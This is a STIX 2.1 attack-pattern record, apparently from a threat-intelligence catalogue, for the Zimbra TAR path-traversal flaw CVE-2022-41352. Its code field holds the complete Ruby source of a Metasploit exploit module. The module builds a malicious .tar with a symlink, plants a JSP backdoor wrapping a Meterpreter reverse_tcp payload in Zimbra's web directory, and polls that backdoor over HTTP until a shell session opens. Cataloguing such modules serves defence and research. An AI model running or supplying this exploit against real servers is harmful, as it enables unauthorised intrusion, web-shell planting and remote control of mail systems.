{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0a6cacad-c8da-469d-8361-da386ac48cc3",
    "created": "2024-08-14T17:02:32.811822Z",
    "modified": "2024-08-14T17:02:32.811826Z",
    "name": "TAR Path Traversal in Zimbra (CVE-2022-41352)",
    "description": " This module creates a .tar file that can be emailed to a Zimbra server",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/zimbra_cpio_cve_2022_41352.rb",
            "external_id": "zimbra_cpio_cve_2022_41352.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-41352"
        },
        {
            "source_name": "reference",
            "url": "https://forums.zimbra.org/viewtopic.php?t=71153&p=306532"
        },
        {
            "source_name": "reference",
            "url": "https://blog.zimbra.com/2022/09/security-update-make-sure-to-install-pax-spax/"
        },
        {
            "source_name": "reference",
            "url": "https://www.openwall.com/lists/oss-security/2015/01/18/7"
        },
        {
            "source_name": "reference",
            "url": "https://lists.gnu.org/archive/html/bug-cpio/2015-01/msg00000.html"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/1DDTvUNFzH/cve-2022-41352/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/FdLYrGfAeg/cve-2015-1197/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P27"
        },
        {
            "source_name": "reference",
            "url": "https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/P34"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'TAR Path Traversal in Zimbra (CVE-2022-41352)',\n        'Description' => %q{\n          This module creates a .tar file that can be emailed to a Zimbra server\n          to exploit CVE-2022-41352. If successful, it plants a JSP-based\n          backdoor in the public web directory, then executes that backdoor.\n\n          The core vulnerability is a path-traversal issue in the cpio command-\n          line utlity that can extract an arbitrary file to an arbitrary\n          location on a Linux system (CVE-2015-1197). Most Linux distros have\n          chosen not to fix it.\n\n          This issue is exploitable on Red Hat-based systems (and other hosts\n          without pax installed) running versions:\n\n          * Zimbra Collaboration Suite 9.0.0 Patch 26 (and earlier)\n          * Zimbra Collaboration Suite 8.8.15 Patch 33 (and earlier)\n\n          The patch simply makes \"pax\" a pre-requisite.\n        },\n        'Author' => [\n          'Alexander Cherepanov', # PoC (in 2015)\n          'yeak', # Initial report\n          'Ron Bowes', # Analysis, PoC, and module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2022-41352'],\n          ['URL', 'https://forums.zimbra.org/viewtopic.php?t=71153&p=306532'],\n          ['URL', 'https://blog.zimbra.com/2022/09/security-update-make-sure-to-install-pax-spax/'],\n          ['URL', 'https://www.openwall.com/lists/oss-security/2015/01/18/7'],\n          ['URL', 'https://lists.gnu.org/archive/html/bug-cpio/2015-01/msg00000.html'],\n          ['URL', 'https://attackerkb.com/topics/1DDTvUNFzH/cve-2022-41352/rapid7-analysis'],\n          ['URL', 'https://attackerkb.com/topics/FdLYrGfAeg/cve-2015-1197/rapid7-analysis'],\n          ['URL', 'https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P27'],\n          ['URL', 'https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/P34'],\n        ],\n        'Platform' => 'linux',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [ 'Zimbra Collaboration Suite', {} ]\n        ],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n          'TARGET_PATH' => '/opt/zimbra/jetty_base/webapps/zimbra/',\n          'TARGET_FILENAME' => nil,\n          'DisablePayloadHandler' => false,\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Stance' => Msf::Exploit::Stance::Passive,\n        'DefaultTarget' => 0,\n        'Privileged' => false,\n        'DisclosureDate' => '2022-06-28',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'payload.tar']),\n\n        # Separating the path, filename, and extension allows us to randomize the filename\n        OptString.new('TARGET_PATH', [ true, 'The location the payload should extract to (an absolute path - eg, /opt/zimbra/...).']),\n        OptString.new('TARGET_FILENAME', [ false, 'The filename to write in the target directory; should have a .jsp extension (default: public/<random>.jsp).']),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('SYMLINK_FILENAME', [ false, 'The name of the symlink file to use (default: random)']),\n        OptBool.new('TRIGGER_PAYLOAD', [ false, 'If set, attempt to trigger the payload via an HTTP request.', true ]),\n\n        # Took this from multi/handler\n        OptInt.new('ListenerTimeout', [ false, 'The maximum number of seconds to wait for new sessions.', 0 ]),\n        OptInt.new('CheckInterval', [ true, 'The number of seconds to wait between each attempt to trigger the payload on the server.', 5 ])\n      ]\n    )\n  end\n\n  def exploit\n    print_status('Encoding the payload as .jsp')\n    payload = Msf::Util::EXE.to_jsp(generate_payload_exe)\n\n    # Small sanity-check\n    if datastore['TARGET_FILENAME'] && !datastore['TARGET_FILENAME'].end_with?('.jsp')\n      print_warning('TARGET_FILENAME does not end with .jsp, was that intentional?')\n    end\n\n    # Generate a filename if needed\n    target_filename = datastore['TARGET_FILENAME'] || \"public/#{Rex::Text.rand_text_alpha_lower(4..10)}.jsp\"\n    symlink_filename = datastore['SYMLINK_FILENAME'] || Rex::Text.rand_text_alpha_lower(4..10)\n\n    # Sanity check - the file shouldn't exist, but we should be able to do requests to the server\n    if datastore['TRIGGER_PAYLOAD']\n      print_status('Checking the HTTP connection to the target')\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri' => normalize_uri(target_filename)\n      )\n\n      unless res\n        fail_with(Failure::Unknown, 'Could not connect to the server via HTTP (disable TRIGGER_PAYLOAD if you plan to trigger it manually)')\n      end\n\n      # Break when the file successfully appears\n      unless res.code == 404\n        fail_with(Failure::Unknown, \"Server returned an unexpected result when we attempted to trigger our payload (expected HTTP/404, got HTTP/#{res.code}\")\n      end\n    end\n\n    # Create the file\n    begin\n      contents = StringIO.new\n      Rex::Tar::Writer.new(contents) do |t|\n        print_status(\"Adding symlink to path to .tar file: #{datastore['TARGET_PATH']}\")\n        t.add_symlink(symlink_filename, datastore['TARGET_PATH'], 0o755)\n\n        print_status(\"Adding target file to the archive: #{target_filename}\")\n\n        t.add_file(File.join(symlink_filename, target_filename), 0o644) do |f|\n          f.write(payload)\n        end\n      end\n      contents.seek(0)\n      tar = contents.read\n      contents.close\n    rescue StandardError => e\n      fail_with(Failure::BadConfig, \"Failed to encode .tar file: #{e}\")\n    end\n    file_create(tar)\n\n    print_good('File created! Email the file above to any user on the target Zimbra server')\n\n    # Bail if they don't want the payload triggered\n    return unless datastore['TRIGGER_PAYLOAD']\n\n    register_file_for_cleanup(File.join(datastore['TARGET_PATH'], target_filename))\n\n    interval = datastore['CheckInterval'].to_i\n    print_status(\"Trying to trigger the backdoor @ #{target_filename} every #{interval}s [backgrounding]...\")\n\n    # This loop is mostly from `multi/handler`\n    stime = Process.clock_gettime(Process::CLOCK_MONOTONIC).to_i\n    timeout = datastore['ListenerTimeout'].to_i\n\n    # We flip this once we trigger the payload\n    keep_sending = true\n    loop do\n      break if session_created?\n      break if timeout > 0 && (stime + timeout < Process.clock_gettime(Process::CLOCK_MONOTONIC).to_i)\n\n      # Once we've triggered the payload, stop trying to\n      if keep_sending\n        res = send_request_cgi(\n          'method' => 'GET',\n          'uri' => normalize_uri(target_filename)\n        )\n\n        unless res\n          fail_with(Failure::Unknown, 'Could not connect to the server to trigger the payload')\n        end\n\n        # Break when the file successfully appears\n        if res.code == 200\n          print_good('Successfully triggered the payload')\n          keep_sending = false\n          next\n        end\n      end\n\n      Rex::ThreadSafe.sleep(interval)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-06-28",
    "x_mitre_platforms": [
        "linux'"
    ]
}